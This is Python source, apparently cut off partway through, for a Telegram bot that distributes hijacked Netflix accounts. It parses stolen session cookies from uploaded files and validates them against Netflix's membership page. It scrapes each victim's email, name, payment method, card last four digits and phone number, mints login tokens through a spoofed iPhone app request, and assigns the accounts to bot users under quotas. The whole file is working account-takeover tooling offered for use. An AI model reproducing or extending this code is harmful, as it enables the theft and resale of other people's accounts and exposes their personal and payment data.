import sys
import asyncio
import json
import os
import re
import time
import ssl
import sqlite3
import threading
import zipfile
import io
import traceback
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor
import logging

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

ssl._create_default_https_context = ssl._create_unverified_context

# ============================================================
# IMPORTS
# ============================================================
try:
    import libsql_experimental as libsql
    HAS_LIBSQL = True
except ImportError:
    try:
        import libsql
        HAS_LIBSQL = True
    except ImportError:
        HAS_LIBSQL = False

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ChatMember
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")
REPORT_CHANNEL_ID = os.getenv("REPORT_CHANNEL_ID", "")

admin_ids_str = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(aid.strip()) for aid in admin_ids_str.split(",") if aid.strip().isdigit()]

WORKING_COOLDOWN_MINUTES = int(os.getenv("COOLDOWN_MINUTES", 5))
MAX_ACCOUNTS_PER_USER = int(os.getenv("MAX_ACCOUNTS", 5))
MAX_CHECK_THREADS = int(os.getenv("MAX_THREADS", 20))
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
# DATABASE - DUAL: TURSO (Persistent) + SQLite (Accounts)
# ============================================================
class Database:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        self.turso_conn = None
        self.sqlite_conn = None
        self.use_turso = False
        
        # ---- Turso Connection (Persistent Data) ----
        if HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://"):
            try:
                if TURSO_AUTH_TOKEN:
                    self.turso_conn = libsql.connect(TURSO_DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
                else:
                    self.turso_conn = libsql.connect(TURSO_DATABASE_URL)
                self.use_turso = True
                print("✅ Turso connected (Persistent)")
                self._init_turso_tables()
            except Exception as e:
                print(f"⚠️ Turso failed: {e}")
                self.use_turso = False
        
        # ---- SQLite Connection (Accounts - Temporary) ----
        try:
            self.sqlite_conn = sqlite3.connect("accounts.db", check_same_thread=False)
            self.sqlite_conn.execute('PRAGMA journal_mode=WAL')
            self.sqlite_conn.execute('PRAGMA synchronous=NORMAL')
            print("✅ SQLite connected (Accounts)")
            self._init_sqlite_tables()
        except Exception as e:
            print(f"❌ SQLite error: {e}")
            raise
    
    def _init_turso_tables(self):
        """Persistent tables for users, reports, logs, channels, stats."""
        if not self.turso_conn:
            return
        cur = self.turso_conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_banned BOOLEAN DEFAULT 0,
                is_admin BOOLEAN DEFAULT 0,
                last_account_time TIMESTAMP,
                total_working INT DEFAULT 0,
                total_notworking INT DEFAULT 0,
                working_reports INT DEFAULT 0,
                notworking_reports INT DEFAULT 0,
                accounts_used INT DEFAULT 0,
                pending_report BOOLEAN DEFAULT 0,
                pending_report_account_id INTEGER,
                pending_report_type TEXT,
                warnings INT DEFAULT 0
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                account_id INTEGER,
                report_type TEXT,
                screenshot_file_id TEXT,
                status TEXT DEFAULT 'pending',
                reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                reviewed_at TIMESTAMP,
                admin_note TEXT,
                admin_id INTEGER,
                channel_post_id INTEGER
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                message TEXT,
                admin_reply TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                replied_at TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE,
                channel_name TEXT,
                invite_link TEXT,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS stock_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                file_name TEXT,
                total_found INT,
                valid_found INT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date DATE UNIQUE,
                total_hits INT DEFAULT 0,
                total_free INT DEFAULT 0,
                total_bad INT DEFAULT 0
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS ban_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                admin_id INTEGER,
                reason TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS warning_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                admin_id INTEGER,
                reason TEXT,
                warning_number INT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.turso_conn.commit()
        print("✅ Turso tables initialized")
    
    def _init_sqlite_tables(self):
        """Accounts table in SQLite - wiped on redeploy."""
        if not self.sqlite_conn:
            return
        cur = self.sqlite_conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT,
                country TEXT,
                plan TEXT,
                cookies TEXT,
                nftoken TEXT,
                nftoken_expiry TEXT,
                assigned_to INTEGER,
                assigned_at TIMESTAMP,
                is_working BOOLEAN DEFAULT 1,
                status TEXT DEFAULT 'available',
                source_file TEXT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_checked TIMESTAMP,
                report_count INT DEFAULT 0,
                account_name TEXT,
                streams INT,
                quality TEXT,
                price TEXT,
                billing_date TEXT,
                member_since TEXT,
                payment_method TEXT,
                card_last4 TEXT,
                phone TEXT,
                extra_member BOOLEAN DEFAULT 0,
                membership_status TEXT,
                email_verified BOOLEAN DEFAULT 0,
                profiles TEXT,
                user_guid TEXT,
                working_confirmed BOOLEAN DEFAULT 0
            )
        ''')
        self.sqlite_conn.commit()
        print("✅ SQLite accounts table initialized")
    
    def execute_turso(self, query, params=None):
        if not self.turso_conn:
            raise Exception("Turso not available")
        cur = self.turso_conn.cursor()
        if params:
            cur.execute(query, params)
        else:
            cur.execute(query)
        return cur
    
    def execute_sqlite(self, query, params=None):
        if not self.sqlite_conn:
            raise Exception("SQLite not available")
        cur = self.sqlite_conn.cursor()
        if params:
            cur.execute(query, params)
        else:
            cur.execute(query)
        return cur
    
    def commit_turso(self):
        if self.turso_conn:
            self.turso_conn.commit()
    
    def commit_sqlite(self):
        if self.sqlite_conn:
            self.sqlite_conn.commit()

db = Database()

# ============================================================
# SAFE HELPERS
# ============================================================

def safe_str(value, default="Unknown"):
    if value is None:
        return default
    return str(value).strip() or default

def safe_int(value, default=0):
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def safe_bool(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        return value.lower() in ("true", "yes", "1", "on")
    return False

# ============================================================
# DATABASE HELPERS - TURSO (Persistent)
# ============================================================

def get_user(user_id: int):
    try:
        cur = db.execute_turso('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = cur.fetchone()
        if row:
            return {
                "user_id": row[0], "username": safe_str(row[1]), "first_name": safe_str(row[2]),
                "joined_at": safe_str(row[3]), "is_banned": safe_bool(row[4]), "is_admin": safe_bool(row[5]),
                "last_account_time": safe_str(row[6]), "total_working": safe_int(row[7]),
                "total_notworking": safe_int(row[8]), "working_reports": safe_int(row[9]),
                "notworking_reports": safe_int(row[10]), "accounts_used": safe_int(row[11]),
                "pending_report": safe_bool(row[12]), "pending_report_account_id": safe_int(row[13]),
                "pending_report_type": safe_str(row[14]), "warnings": safe_int(row[15]),
            }
    except Exception as e:
        logger.error(f"get_user error: {e}")
    return {
        "user_id": user_id, "username": "", "first_name": "",
        "joined_at": "", "is_banned": False, "is_admin": False,
        "last_account_time": "", "total_working": 0, "total_notworking": 0,
        "working_reports": 0, "notworking_reports": 0, "accounts_used": 0,
        "pending_report": False, "pending_report_account_id": 0,
        "pending_report_type": "", "warnings": 0,
    }

def create_user(user_id: int, username: str, first_name: str):
    try:
        is_admin = 1 if user_id in ADMIN_IDS else 0
        db.execute_turso('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, is_admin, pending_report, warnings)
            VALUES (?, ?, ?, ?, 0, 0)
        ''', (user_id, safe_str(username), safe_str(first_name), is_admin))
        db.commit_turso()
    except Exception as e:
        logger.error(f"create_user error: {e}")

def log_stock(admin_id: int, file_name: str, total: int, valid: int):
    try:
        db.execute_turso('INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) VALUES (?, ?, ?, ?)',
                   (admin_id, file_name, total, valid))
        db.commit_turso()
    except Exception as e:
        logger.error(f"log_stock error: {e}")

def log_daily_stats(hits: int = 0, free: int = 0, bad: int = 0):
    try:
        cur = db.execute_turso('SELECT id FROM stats WHERE date = CURRENT_DATE')
        row = cur.fetchone()
        if row:
            db.execute_turso('''
                UPDATE stats 
                SET total_hits = total_hits + ?, total_free = total_free + ?, total_bad = total_bad + ?
                WHERE date = CURRENT_DATE
            ''', (hits, free, bad))
        else:
            db.execute_turso('''
                INSERT INTO stats (date, total_hits, total_free, total_bad)
                VALUES (CURRENT_DATE, ?, ?, ?)
            ''', (hits, free, bad))
        db.commit_turso()
    except Exception as e:
        logger.error(f"log_daily_stats error: {e}")

def update_report_channel_post(report_id: int, channel_post_id: int):
    try:
        db.execute_turso('UPDATE reports SET channel_post_id = ? WHERE id = ?', (channel_post_id, report_id))
        db.commit_turso()
    except Exception as e:
        logger.error(f"update_report_channel_post error: {e}")

def confirm_account_working(account_id: int, report_id: int, admin_id: int):
    try:
        db.execute_sqlite('UPDATE accounts SET is_working = 1, status = "available", working_confirmed = 1 WHERE id = ?', (account_id,))
        db.commit_sqlite()
        db.execute_turso('UPDATE reports SET status = "accepted", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (admin_id, report_id))
        db.commit_turso()
        return True
    except Exception as e:
        logger.error(f"confirm_account_working error: {e}")
        return False

def add_warning(user_id: int, admin_id: int, reason: str):
    try:
        cur = db.execute_turso('SELECT warnings FROM users WHERE user_id = ?', (user_id,))
        row = cur.fetchone()
        warnings = row[0] + 1 if row else 1
        db.execute_turso('UPDATE users SET warnings = ? WHERE user_id = ?', (warnings, user_id))
        db.execute_turso('''
            INSERT INTO warning_logs (user_id, admin_id, reason, warning_number)
            VALUES (?, ?, ?, ?)
        ''', (user_id, admin_id, reason, warnings))
        db.commit_turso()
        return warnings
    except Exception as e:
        logger.error(f"add_warning error: {e}")
        return 0

def ban_user_from_bot(user_id: int, admin_id: int, reason: str):
    try:
        db.execute_turso('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
        db.execute_turso('''
            INSERT INTO ban_logs (user_id, admin_id, reason)
            VALUES (?, ?, ?)
        ''', (user_id, admin_id, reason))
        db.commit_turso()
        return True
    except Exception as e:
        logger.error(f"ban_user_from_bot error: {e}")
        return False

def unban_user_from_bot(user_id: int, admin_id: int):
    try:
        db.execute_turso('UPDATE users SET is_banned = 0, warnings = 0 WHERE user_id = ?', (user_id,))
        db.commit_turso()
        return True
    except Exception as e:
        logger.error(f"unban_user_from_bot error: {e}")
        return False

# ============================================================
# DATABASE HELPERS - SQLITE (Accounts)
# ============================================================

def get_available_accounts():
    """Get available accounts from SQLite with debug logging."""
    try:
        # Debug: Count total accounts
        total_cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts')
        total = total_cur.fetchone()[0]
        logger.info(f"📊 Total accounts in SQLite: {total}")
        
        # Get available accounts
        cur = db.execute_sqlite('''
            SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
                   account_name, streams, quality, price, billing_date, member_since,
                   payment_method, card_last4, phone, extra_member, profiles, user_guid
            FROM accounts WHERE status = 'available' AND is_working = 1 ORDER BY id ASC
        ''')
        rows = cur.fetchall()
        logger.info(f"✅ Available accounts: {len(rows)}")
        
        return [
            {
                "id": r[0], "email": safe_str(r[1]), "country": safe_str(r[2]), "plan": safe_str(r[3]),
                "cookies": safe_str(r[4]), "nftoken": safe_str(r[5]), "nftoken_expiry": safe_str(r[6]),
                "status": safe_str(r[7]), "account_name": safe_str(r[8]), "streams": safe_int(r[9]),
                "quality": safe_str(r[10]), "price": safe_str(r[11]), "billing_date": safe_str(r[12]),
                "member_since": safe_str(r[13]), "payment_method": safe_str(r[14]),
                "card_last4": safe_str(r[15]), "phone": safe_str(r[16]), "extra_member": safe_bool(r[17]),
                "profiles": safe_str(r[18]), "user_guid": safe_str(r[19]),
            }
            for r in rows
        ]
    except Exception as e:
        logger.error(f"get_available_accounts error: {e}")
        traceback.print_exc()
        return []

def get_total_accounts():
    """Get total available accounts from SQLite."""
    try:
        cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
        total = cur.fetchone()[0] or 0
        
        cur = db.execute_sqlite('SELECT plan, COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1 GROUP BY plan')
        plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
        
        logger.info(f"📊 Total available: {total}, Plans: {plan_counts}")
        return {"total": total, "plans": plan_counts}
    except Exception as e:
        logger.error(f"get_total_accounts error: {e}")
        return {"total": 0, "plans": {}}

def assign_account(user_id: int):
    """Assign an account to user from SQLite."""
    try:
        accounts = get_available_accounts()
        if not accounts:
            return None
        
        account = accounts[0]
        
        # Release any existing assigned accounts
        db.execute_sqlite('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE assigned_to = ?', (user_id,))
        
        # Assign this account
        cur = db.execute_sqlite('''
            UPDATE accounts 
            SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
            WHERE id = ? AND status = 'available'
        ''', (user_id, account["id"]))
        
        if cur.rowcount > 0:
            # Update user in Turso
            db.execute_turso('''
                UPDATE users 
                SET last_account_time = CURRENT_TIMESTAMP, accounts_used = accounts_used + 1
                WHERE user_id = ?
            ''', (user_id,))
            db.commit_turso()
            db.commit_sqlite()
            logger.info(f"✅ Account {account['id']} assigned to user {user_id}")
            return account
        
        db.commit_sqlite()
        return None
    except Exception as e:
        logger.error(f"assign_account error: {e}")
        traceback.print_exc()
        return None

def get_assigned_account(user_id: int):
    """Get user's currently assigned account from SQLite."""
    try:
        cur = db.execute_sqlite('''
            SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
                   account_name, streams, quality, price, billing_date, member_since,
                   payment_method, card_last4, phone, extra_member, profiles, user_guid
            FROM accounts WHERE assigned_to = ? AND status = 'assigned' ORDER BY assigned_at DESC LIMIT 1
        ''', (user_id,))
        row = cur.fetchone()
        if row:
            return {
                "id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), "plan": safe_str(row[3]),
                "cookies": safe_str(row[4]), "nftoken": safe_str(row[5]), "nftoken_expiry": safe_str(row[6]),
                "account_name": safe_str(row[7]), "streams": safe_int(row[8]), "quality": safe_str(row[9]),
                "price": safe_str(row[10]), "billing_date": safe_str(row[11]), "member_since": safe_str(row[12]),
                "payment_method": safe_str(row[13]), "card_last4": safe_str(row[14]), "phone": safe_str(row[15]),
                "extra_member": safe_bool(row[16]), "profiles": safe_str(row[17]), "user_guid": safe_str(row[18]),
            }
    except Exception as e:
        logger.error(f"get_assigned_account error: {e}")
    return None

def release_account(account_id: int):
    """Release account back to available pool."""
    try:
        db.execute_sqlite('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
        db.commit_sqlite()
        logger.info(f"✅ Account {account_id} released")
    except Exception as e:
        logger.error(f"release_account error: {e}")

def delete_account(account_id: int):
    """Delete account from SQLite."""
    try:
        db.execute_sqlite('DELETE FROM accounts WHERE id = ?', (account_id,))
        db.commit_sqlite()
        logger.info(f"✅ Account {account_id} deleted")
        return True
    except Exception as e:
        logger.error(f"delete_account error: {e}")
        return False

def can_get_account(user_id: int):
    """Check if user can get an account."""
    user = get_user(user_id)
    if safe_bool(user.get("is_banned")):
        return False, "🚫 You are banned."
    
    last_time = user.get("last_account_time")
    if last_time:
        try:
            last_dt = datetime.strptime(str(last_time), "%Y-%m-%d %H:%M:%S")
            diff = datetime.utcnow() - last_dt
            cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
            if diff.total_seconds() < cooldown_seconds:
                remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
                return False, f"⏳ Wait {remaining} minute(s)."
        except Exception:
            pass
    
    if safe_int(user.get("accounts_used")) >= MAX_ACCOUNTS_PER_USER:
        return False, f"⚠️ Max {MAX_ACCOUNTS_PER_USER} accounts."
    
    return True, ""

def save_account_batch(accounts):
    """Save accounts to SQLite with proper verification."""
    if not accounts:
        return 0
    
    saved = 0
    try:
        # Get count before
        before_cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts')
        before = before_cur.fetchone()[0]
        logger.info(f"📊 Before insert: {before} accounts")
        
        for a in accounts:
            try:
                db.execute_sqlite('''
                    INSERT INTO accounts (
                        email, country, plan, cookies, nftoken, nftoken_expiry,
                        source_file, last_checked, account_name, streams, quality,
                        price, billing_date, member_since, payment_method, card_last4,
                        phone, extra_member, membership_status, email_verified,
                        profiles, user_guid, working_confirmed, status, is_working
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'available', 1)
                ''', (
                    safe_str(a.get("email")),
                    safe_str(a.get("country")),
                    safe_str(a.get("plan")),
                    safe_str(a.get("cookies")),
                    safe_str(a.get("nftoken")),
                    safe_str(a.get("nftoken_expiry")),
                    safe_str(a.get("source_file")),
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    safe_str(a.get("account_name")),
                    safe_int(a.get("streams")),
                    safe_str(a.get("quality")),
                    safe_str(a.get("price")),
                    safe_str(a.get("billing_date")),
                    safe_str(a.get("member_since")),
                    safe_str(a.get("payment_method")),
                    safe_str(a.get("card_last4")),
                    safe_str(a.get("phone")),
                    1 if safe_bool(a.get("extra_member")) else 0,
                    safe_str(a.get("membership_status")),
                    1 if safe_bool(a.get("email_verified")) else 0,
                    safe_str(a.get("profiles")),
                    safe_str(a.get("user_guid")),
                ))
                saved += 1
            except Exception as e:
                logger.error(f"Failed to save account: {e}")
                continue
        
        db.commit_sqlite()
        
        # Verify
        after_cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts')
        after = after_cur.fetchone()[0]
        logger.info(f"📊 After insert: {after} accounts")
        logger.info(f"✅ Saved: {saved} new accounts")
        
        # Verify available
        avail_cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
        available = avail_cur.fetchone()[0]
        logger.info(f"📊 Available accounts now: {available}")
        
        return saved
        
    except Exception as e:
        logger.error(f"Batch save error: {e}")
        traceback.print_exc()
        return 0

# ============================================================
# NFToken GENERATOR
# ============================================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken(netflix_id: str, attempts: int = 3):
    if not netflix_id:
        return None, None
    for attempt in range(attempts):
        try:
            headers = dict(NFTOKEN_HEADERS)
            headers["Cookie"] = f"NetflixId={netflix_id}"
            headers["x-netflix.request.attempt"] = str(attempt + 1)
            response = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                token = token_data.get("token")
                expires = token_data.get("expires")
                if token:
                    return token, expires
            time.sleep(0.5)
        except Exception:
            time.sleep(0.5)
    return None, None

# ============================================================
# COOKIE EXTRACTION & CHECKING
# ============================================================

def extract_cookie_pairs(content: str):
    pairs = []
    seen = set()
    
    # Try JSON
    try:
        data = json.loads(content)
        if isinstance(data, dict) and "cookies" in data:
            cookies = data.get("cookies", [])
            nid = None
            sid = None
            for cookie in cookies:
                if cookie.get("name") == "NetflixId":
                    nid = safe_str(cookie.get("value"))
                elif cookie.get("name") == "SecureNetflixId":
                    sid = safe_str(cookie.get("value"))
            if nid and nid not in seen:
                seen.add(nid)
                pairs.append((nid, sid))
    except Exception:
        pass
    
    # Netscape format
    if not pairs:
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                if parts[5] == "NetflixId":
                    nid = parts[6].strip()
                    if nid and nid not in seen:
                        seen.add(nid)
                        pairs.append((nid, None))
    
    # Regex fallback
    if not pairs:
        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
        netflix_matches = netflix_pattern.findall(content)
        secure_matches = secure_pattern.findall(content)
        for i, nid in enumerate(netflix_matches):
            nid = nid.strip('"\'')
            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
            if nid and nid not in seen:
                seen.add(nid)
                pairs.append((nid, sid))
    
    return pairs

def get_cookie_text(netflix_id: str, secure_id: Optional[str] = None) -> str:
    lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
    if secure_id:
        lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
    return "\n".join(lines)

def check_account(cookies_dict: Dict):
    if not cookies_dict or "NetflixId" not in cookies_dict:
        return {"valid": False, "error": "Missing NetflixId"}
    try:
        session = requests.Session()
        for name, value in cookies_dict.items():
            session.cookies.set(name, value, domain=".netflix.com")
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "identity",
        }
        for attempt in range(MAX_RETRIES):
            try:
                response = session.get(
                    "https://www.netflix.com/account/membership",
                    headers=headers,
                    timeout=CHECK_TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
                if response.status_code != 200:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(0.5)
                        continue
                    return {"valid": False, "error": f"HTTP {response.status_code}"}
                
                if "login" in response.url.lower() or "signin" in response.url.lower():
                    return {"valid": False, "error": "Redirected to login"}
                
                text = response.text
                
                # Extract data
                email = None
                for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        email = match.group(1).strip()
                        break
                if not email:
                    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
                    if match:
                        email = match.group(1).strip()
                
                name = None
                for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        name = match.group(1).strip()
                        break
                
                country = None
                for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        country = match.group(1).strip()
                        break
                
                plan = None
                for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        plan = match.group(1).strip()
                        break
                
                plan_key = "FREE"
                plan_label = "Free"
                if plan:
                    plan_lower = plan.lower()
                    if any(x in plan_lower for x in ["premium", "高級", "高级"]):
                        plan_key, plan_label = "PREMIUM", "Premium"
                    elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
                        plan_key, plan_label = "STANDARD", "Standard"
                    elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
                        plan_key, plan_label = "BASIC", "Basic"
                
                streams = None
                match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
                if match:
                    streams = int(match.group(1))
                
                price = None
                for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        price = match.group(1).strip()
                        break
                
                billing = None
                match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                if match:
                    billing = match.group(1).strip()
                
                membership_status = None
                match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                if match:
                    membership_status = match.group(1).strip()
                
                profiles = []
                for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
                    if match.group(1) not in profiles:
                        profiles.append(match.group(1))
                profiles_str = ", ".join(profiles) if profiles else None
                
                user_guid = None
